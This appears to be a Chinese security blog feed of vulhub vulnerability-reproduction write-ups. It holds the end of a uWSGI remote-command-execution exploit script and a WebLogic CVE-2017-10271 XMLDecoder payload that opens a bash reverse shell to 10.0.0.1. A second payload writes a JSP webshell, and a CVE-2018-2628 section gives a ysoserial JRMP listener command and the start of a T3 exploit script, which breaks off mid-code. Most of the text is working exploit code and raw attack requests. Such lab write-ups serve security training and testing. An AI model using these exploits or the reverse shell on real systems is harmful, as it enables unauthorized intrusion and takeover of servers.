class="token punctuation">(</span><span class="token string">'//'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    host<span class="token punctuation">,</span> _<span class="token punctuation">,</span> url <span class="token operator">=</span> url<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token string">'/'</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fetch_data</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span> payload<span class="token operator">=</span>None<span class="token punctuation">,</span> body<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'http'</span> <span class="token operator">not</span> <span class="token keyword">in</span> uri<span class="token punctuation">:</span>        uri <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> uri    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># s.headers['UWSGI_FILE'] = payload</span>    <span class="token keyword">if</span> body<span class="token punctuation">:</span>        <span class="token keyword">import</span> urlparse        body_d <span class="token operator">=</span> dict<span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>parse_qsl<span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>urlsplit<span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>        d <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>uri<span class="token punctuation">,</span> data<span class="token operator">=</span>body_d<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">'code'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>        <span class="token string">'text'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>text<span class="token punctuation">,</span>        <span class="token string">'header'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>headers    <span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">ask_uwsgi</span><span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'tcp'</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'unix'</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_UNIX<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pack_uwsgi_vars<span class="token punctuation">(</span>var<span class="token punctuation">)</span> <span class="token operator">+</span> body<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># Actually we dont need the response, it will block if we run any commands.</span>    <span class="token comment" spellcheck="true"># So I comment all the receiving stuff. </span>    <span class="token comment" spellcheck="true"># while 1:</span>    <span class="token comment" spellcheck="true">#     data = s.recv(4096)</span>    <span class="token comment" spellcheck="true">#     if not data:</span>    <span class="token comment" spellcheck="true">#         break</span>    <span class="token comment" spellcheck="true">#     response.append(data)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> b<span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">curl</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> addr_and_port<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>    host<span class="token punctuation">,</span> uri <span class="token operator">=</span> get_host_from_url<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>    path<span class="token punctuation">,</span> _<span class="token punctuation">,</span> qs <span class="token operator">=</span> uri<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'http'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> fetch_data<span class="token punctuation">(</span>addr_and_port<span class="token operator">+</span>uri<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'tcp'</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> host <span class="token operator">or</span> parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> addr_and_port    var <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>        <span class="token string">'PATH_INFO'</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> qs<span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>        <span class="token string">'HTTP_HOST'</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>        <span class="token string">'UWSGI_FILE'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> target_url    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ask_uwsgi<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    desc <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    This is a uwsgi client &amp; RCE exploit.    Last modifid at 2018-01-30 by wofeiwo@80sec.com    """</span>    elog <span class="token operator">=</span> <span class="token string">"Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span>desc<span class="token punctuation">,</span> epilog<span class="token operator">=</span>elog<span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">'?'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'tcp'</span><span class="token punctuation">,</span>                        help<span class="token operator">=</span><span class="token string">'Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.'</span><span class="token punctuation">,</span>                        dest<span class="token operator">=</span><span class="token string">'mode'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'http'</span><span class="token punctuation">,</span> <span class="token string">'tcp'</span><span class="token punctuation">,</span> <span class="token string">'unix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--uwsgi'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">'?'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                        help<span class="token operator">=</span><span class="token string">'Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock'</span><span class="token punctuation">,</span>                        dest<span class="token operator">=</span><span class="token string">'uwsgi_addr'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--command'</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">'?'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                        help<span class="token operator">=</span><span class="token string">'Command: The exploit command you want to execute, must have this.'</span><span class="token punctuation">,</span>                        dest<span class="token operator">=</span><span class="token string">'command'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>mode<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"http"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]Currently only tcp/unix method is supported in RCE exploit."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    payload <span class="token operator">=</span> <span class="token string">'exec://'</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>command <span class="token operator">+</span> <span class="token string">"; echo test"</span> <span class="token comment" spellcheck="true"># must have someting in output or the uWSGI crashs.</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Sending payload."</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>curl<span class="token punctuation">(</span>args<span class="token punctuation">.</span>mode<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>uwsgi_addr<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">'/testapp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318105203.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318105211.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> uWSGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2019/03/02/weblogic-10.3.6-wls-wsat-xmldecoder-fan-xu-lie-hua-lou-dong/"/>
      <url>/2019/03/02/weblogic-10.3.6-wls-wsat-xmldecoder-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic < 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><p>Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送如下数据包（注意其中反弹 shell 的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><pre class=" language-http"><code class="language-http">POST /wls-wsat/CoordinatorPortType HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:7001<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> text/xml<span class="token header-name keyword">Content-Length:</span> 633<span class="token text/xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>bash -i <span class="token entity" title="&gt;">&amp;gt;</span><span class="token entity" title="&amp;">&amp;amp;</span> /dev/tcp/10.0.0.1/21 0<span class="token entity" title="&gt;">&amp;gt;</span><span class="token entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">></span></span></span></code></pre><p>成功获取 webshell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318101858.png-water_print" alt=""></p><p>写入 webshell（访问：<a href="http://your-ip:7001/bea_wls_internal/test.jsp）：" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp）：</a></p><pre class=" language-http"><code class="language-http">POST /wls-wsat/CoordinatorPortType HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:7001<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> text/xml<span class="token header-name keyword">Content-Length:</span> 638<span class="token text/xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.io.PrintWriter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>println<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>    <span class="token cdata">&lt;![CDATA[&lt;% out.print("test"); %>    ]]></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>close<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">></span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</title>
      <link href="/2019/03/02/weblogic-wls-core-components-fan-xu-lie-hua-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/02/weblogic-wls-core-components-fan-xu-lie-hua-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><p>Oracle 2018 年 4 月补丁中，修复了 Weblogic Server WLS Core Components 中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过 t3 协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><p>影响版本：<br>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先下载 ysoserial，并启动一个 JRMP Server：</p><pre class=" language-bash"><code class="language-bash">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="token punctuation">[</span>listen port<span class="token punctuation">]</span> CommonsCollections1 <span class="token punctuation">[</span>command<span class="token punctuation">]</span></code></pre><p>其中，[command] 即为执行的命令，而 [listen port] 是 JRMP Server 监听的端口。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318101050.png-water_print" alt=""></p><p>然后，使用如下脚本，向目标Weblogic <a href="http://your-ip:7001" target="_blank" rel="noopener">http://your-ip:7001</a> 发送数据包：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token keyword">import</span> binascii<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#generates ysoserial payload</span>    command <span class="token operator">=</span> <span class="token string">'java -jar {} {} {}:{} > payload.out'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"command: "</span> <span class="token operator">+</span> command<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    bin_file <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'payload.out'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>bin_file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">t3_handshake</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'handshake successful'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">build_t3_request_object</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    data1 <span class="token operator">=</span> <span class="token 